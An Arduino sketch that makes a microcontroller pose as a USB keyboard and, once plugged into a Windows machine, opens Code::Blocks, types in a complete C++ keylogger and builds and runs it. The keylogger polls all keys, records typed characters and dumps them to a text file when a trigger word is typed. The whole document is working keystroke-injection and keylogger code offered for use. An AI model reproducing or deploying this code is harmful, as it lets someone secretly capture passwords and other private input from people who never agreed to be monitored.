#include <Keyboard.h>

void setup() {
  // Start the Keyboard library
  Keyboard.begin();

  delay(2000); // Wait for the system to be ready

  // Step 1: Open Code::Blocks using Win+R
  Keyboard.press(KEY_LEFT_GUI); // Windows key
  Keyboard.press('r');          // 'r' key to open Run dialog
  delay(100);
  Keyboard.releaseAll();        // Release all keys

  delay(500); // Wait for Run dialog to appear

  // Step 2: Type the full path to Code::Blocks executable
  Keyboard.print("C:\\Program Files\\CodeBlocks\\codeblocks.exe"); // Update with the correct path if different

  delay(100); // Brief delay

  // Step 3: Press Enter to open Code::Blocks
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(8000); // Wait for Code::Blocks to fully load

  // Step 4: Select all text in the editor (Ctrl + A)
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a'); // Shortcut for "Select All"
  delay(100);
  Keyboard.releaseAll();

  delay(500); // Wait for selection to complete

  // Step 5: Delete the selected text
  Keyboard.press(KEY_DELETE); // Delete key to clear the editor
  delay(100);
  Keyboard.releaseAll();

  delay(500); // Wait for deletion to complete

  // Step 6: Type the keylogger program into Code::Blocks
  const char* program = R"(
#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>

using namespace std;

void captureKeystrokes() {
    string keystrokes;
    string keyword = "RETRIVAL"; // Correct spelling: "RETRIEVAL"
    string capturedData;
    bool previousKeyState[256] = {false};

    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                if (!previousKeyState[key]) {
                    if (key == VK_SHIFT || key == VK_CONTROL || key == VK_MENU || key == VK_CAPITAL) {
                        continue; // Ignore modifier keys
                    }
                    if (key >= 32 && key <= 126) {
                        keystrokes += static_cast<char>(key);
                        cout << "Captured: " << keystrokes << endl;
                    }

                    // Detect keyword
                    if (keystrokes.size() >= keyword.size() &&
                        keystrokes.substr(keystrokes.size() - keyword.size()) == keyword) {
                        capturedData = keystrokes.substr(0, keystrokes.size() - keyword.size());
                        cout << "\nKeyword detected! Creating text file...\n";

                        ofstream outputFile("captured_keystrokes.txt");
                        if (outputFile.is_open()) {
                            outputFile << capturedData;
                            outputFile.close();
                            cout << "Keystrokes saved to 'captured_keystrokes.txt'\n";
                            system("start notepad captured_keystrokes.txt");
                        }
                        keystrokes.clear();
                    }
                }
                previousKeyState[key] = true;
            } else {
                previousKeyState[key] = false;
            }
        }
        Sleep(10);
    }
}

int main() {
    cout << "Keylogger started. Press keys to capture.\n";
    captureKeystrokes();
    return 0;
}
)";

  // Send the program line by line
  for (int i = 0; program[i] != '\0'; ++i) {
    Keyboard.write(program[i]); // Write each character individually
    delay(10); // Small delay to ensure each key is registered
  }

  delay(5000); // Wait for typing to complete

  // Step 7: Build and run the program (F9 shortcut)
  Keyboard.press(KEY_F9); // Shortcut for Build and Run in Code::Blocks
  delay(100);
  Keyboard.releaseAll();

  delay(2000); // Wait for the save file prompt to appear

  // Step 8: Name the file (e.g., "main.cpp")
  Keyboard.print("main.cpp");
  delay(100);

  // Press Enter to confirm the save
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  // Nothing to do here
}
